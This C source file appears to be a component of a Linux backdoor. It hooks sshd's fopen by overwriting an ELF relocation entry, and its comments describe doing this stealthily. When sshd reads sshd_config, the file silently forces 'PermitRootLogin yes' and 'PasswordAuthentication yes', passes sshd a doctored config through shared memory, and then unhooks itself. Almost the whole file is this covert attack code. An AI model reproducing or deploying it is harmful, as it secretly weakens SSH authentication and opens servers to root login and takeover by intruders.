#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <unistd.h>
//#include <stdbool.h>
//#include <errno.h>
//#include <signal.h>
//#include <setjmp.h>

//#include <security/pam_appl.h>
#include <sys/mman.h>

//#include <dlfcn.h>
//#include <link.h>

#include <sys/shm.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/elf.h>

//#include "pam_private.h"

#include "config_hook.h"
/*
 * the goal is to make sure PermitRootLogin is set to yes - regardless if it is explicity set or not
 *	and then unhook ourselves sneaky beaky like
 * TODO: sanity
 * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
 * TODO: ensure EXPLICIT's robustness -- already had to fix an edge case
 * XXX: there is probably an easier way to do what I'm trying to do with bitmasks, but I like the practice and it feels cool
 */
FILE *my_fopen(char *filename, char *mode)
{
	FILE *fp = ref_fopen(filename, mode);
	fpos_t ref_pos;

	fgetpos(fp, &ref_pos);


	char *str = malloc(sizeof(512));
	size_t n = 0;
	/* 
	 * libkeyutils hates _GNU_SOURCE and I haven't bothered to learn about Makefiles and advanced #define usage
	 * 	so no strcasestr();
	 * TODO TODO TODO: use strcasestr() TODO TODO TODO
	 */
	char *PermitRootLogin = NULL;
	char *PasswordAuthentication = NULL;

	unsigned long long BITMASK = MASK_64;	

	int ret = 42;
	while (ret != -1) {
		ret = getline(&str, &n, fp); /* XXX: should hopefully be safe ?? */
	

		if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0)
			PermitRootLogin = strstr(str, "PermitRootLogin");

		/* determine if PermitRootLogin is explicity set to (Yes || No) - (case insensitive) */
		if (PermitRootLogin != NULL) {

			/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
			BITMASK &= ~ PermitRootLogin_MASK;

			/* we have a valid PermitRootLogin string - not commented 
			 *		if the string is set to yes then there is NOWORK to be done
			 *		otherwise we will have to EXPLICITly redefine no
			 */

			char *setting = strstr(PermitRootLogin, "Yes");	
			if (setting == NULL)
				setting = strstr(PermitRootLogin, "yes");	
		
			if (setting != NULL) {
				BITMASK |= PermitRootLogin_NOWORK;
			} else {

				setting = strstr(PermitRootLogin, "No");	
				if (setting == NULL)
					setting = strstr(PermitRootLogin, "no");	

				/* PermitRootLogin [n-N][o] */
				if (setting != NULL) {
					BITMASK |= PermitRootLogin_EXPLICIT;
				}
			}
		
			PermitRootLogin = NULL;
		}


		if (strncmp(str, "PasswordAuthentication ", strlen("PasswordAuthentication ")) == 0) {
			PasswordAuthentication = strstr(str, "PasswordAuthentication");

			if (PasswordAuthentication != NULL) {

				/* clear any previously set PasswordAuthentication flags -- it's possible for a sshd_config to have duplicates */
				BITMASK &= ~ PasswordAuthentication_MASK;

				/* we have a valid PasswordAuthentication string - not commented 
				 *		if the string is set to yes then there is NOWORK to be done
				 *		otherwise we will have to EXPLICITly redefine no
				 */

				char *setting = strstr(PasswordAuthentication, "Yes");	
				if (setting == NULL)
					setting = strstr(PasswordAuthentication, "yes");	
			
				if (setting != NULL) {
					BITMASK |= PasswordAuthentication_NOWORK;
				} else {

					setting = strstr(PasswordAuthentication, "No");	
					if (setting == NULL)
						setting = strstr(PasswordAuthentication, "no");	

					/* PasswordAuthentication [n-N][o] */
					if (setting != NULL) {
						BITMASK |= PasswordAuthentication_EXPLICIT;
					}
				}
			
				PasswordAuthentication = NULL;
			}
		}
	}
	//fclose(fp); /* XXX: will be useful if something goes wrong later */
	free(str);
		
	signed long int orig_sshd_config_size;
	struct stat st;	
	stat(filename, &st);
	orig_sshd_config_size = (signed long int) st.st_size;


	/* if we never ran into any of the strings we wanted in sshd_config 
	 *	 -- BITMASK is unset
	 * then make sure to append these strings to the end of the duped sshd_config we are making
	 */	
	unsigned long long tmpmask = BITMASK & PermitRootLogin_MASK;
		
	if (tmpmask != PermitRootLogin_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
		BITMASK |= PermitRootLogin_APPEND;

	
	tmpmask = BITMASK & PasswordAuthentication_MASK;

	if (tmpmask != PasswordAuthentication_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
		BITMASK |= PasswordAuthentication_APPEND;
	


	/* read the sshd_specified in the paramater filename into a FD we can read() from */

	int buf_len = orig_sshd_config_size + 150; /* what's 150 bytes between friends? */
	char *buf = malloc(buf_len);

	int orig_fd = open(filename, O_RDONLY);

	read(orig_fd, buf, buf_len);
	close(orig_fd);

	/* we have original sshd_config in memory - buf */



	char *PRL_Y = "PermitRootLogin yes\n";
	char *PA_Y = "PasswordAuthentication yes\n ";

	char *new = NULL;


	/* _EXPLICITS */
	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_EXPLICIT) {
		_EXPLICIT_work(&new, "PermitRootLogin ", PRL_Y, "PermitRootLogin no", &buf, &buf_len);	
	}

	/* same code as above -- XXX: could probably be made into a function */
	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {
		_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, "PasswordAuthentication no ", &buf, &buf_len);
	}


	/* _APPENDS */
	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_APPEND) {
		_APPEND_work(&new, &buf_len, filename, PRL_Y);
	}
	
	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_APPEND) {
		_APPEND_work(&new, &buf_len, filename, PA_Y);
	}








	/* this passes a valid FILE* back to sshd using SHM and the new sshd_config we just made
	 * 	shm_unlink should ensure that when sshd fclose(fp) the shm will be deleted 
	 */
	int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
	
	ftruncate(fd, buf_len);

	mmap(0, buf_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );

	write(fd, new, buf_len);

	//free(new);	
	fp = fdopen(fd, mode);
	rewind(fp);
	
	shm_unlink("/7355608");

	hook_rela_addend(ref_fopen_Rela, ref_fopen);
	return fp;
}


int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, char **__buf, int *_buf_len)
{
	int buf_len = *_buf_len;
	uint64_t bytes_from_start = 0;
	
	char *config_name_ptr;

	/* dup buf into tok_buf to preserve our original sshd_config */
	char *tok_buf = malloc(buf_len); /* FIXME: this will leak */
	
	memcpy(tok_buf, *__buf, buf_len);

	char *str = strtok(tok_buf, "\n");
	while (str != NULL) {
		if (strncmp(str, config_name, strlen(config_name)) == 0) {
			config_name_ptr = strstr(str, config_name);
		}
		str = strtok(NULL, "\n");
	}

	/* how far is config_name_ptr from the start of sshd_config */
	bytes_from_start = (char *) config_name_ptr - (char *) tok_buf;

	/* copy all of the bytes from sshd_config into new -- up until (excluding) config_name_ptr */
	if (*__new == NULL)
		*__new = malloc(buf_len);

	memcpy(*__new, *__buf, bytes_from_start);

	/* bytes_from_start can be wonky
	 * 	e.g. the above memcpy will copy junk after a valid config option into new
	 * this will make sure that bytes_from_start is aligned to a valid \n,
	 */
	int i = 0;
	char x; 
	x = *((char*) *__new + bytes_from_start); // get single char from (new + bytes_from_start)
	while (x != '\n') {
		bytes_from_start--;
		i++;
		x = *((char*) *__new + bytes_from_start);
	}
	
	/* ... */
	memcpy((char *) *__new + bytes_from_start + i, redefine, strlen(redefine));

	/* get number of char until \n in "config_name_ptr no" 
	 * XXX: this most likely isn't needed anymore as this will always be the above no string (+1)
	 */
	int newline = strcspn(config_name_ptr, "\n");
	newline += 1; /* +1 - strlen(yes) = 3 . strlen(no) = 2 */
	
	
	/* 
	 * if this doesn't make you love C, I don't know what would 
	 *
	 * copy into new -- make sure we skip the "config_name_ptr yes" we just added by adding newline
	 * from buf -- bytes_from_start + strlen() will cut "config_name_ptr no" from buf so we can append the rest of buf
	 */	
	memcpy((char *) *__new + (unsigned long long) bytes_from_start + newline + i, 
				(char*) *__buf + bytes_from_start + i + strlen(old),
				strlen(*__buf + bytes_from_start));

	
	free(*__buf);
	*__buf = *__new;
	
	return 0;
}







/* XXX:cleanup **__new */
int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
{
	int buf_len = *_buf_len;

	/* no EXPLICITs or APPENDs have happened before -- it's up to us to read() and malloc */
	if (*__new == NULL)  {
		*__new = malloc(buf_len);
		int orig_fd = open(filename, O_RDONLY);
		read(orig_fd, *__new, buf_len);
		close(orig_fd);
	}	
	
	int append_len = strlen(append);
	int newlen = strlen(*__new);

	if ((newlen + append_len) > buf_len) {
		if (realloc(*__new, buf_len + append_len) == NULL) {
			/* mercy */
			return -1111111111;
		}
		*_buf_len = *_buf_len + append_len;
	}

	/* XXX: do timing tests on how long strncat takes */
	memcpy((char *) *__new + newlen, append, append_len);

	/* ensure null termination */	
	memcpy(((char*) *__new + newlen + append_len), "\0", 1);
	
	return 0;
}



static int hook_rela_addend(Elf64_Rela *foundrela, void *func)
{
	int ret;
	int PAGE_SIZE = getpagesize();
	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
	if (ret != 0)
		return -1;

	foundrela->r_addend = (unsigned long long)func; 

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
	if (ret != 0)
		return -1;

	return 0;
}
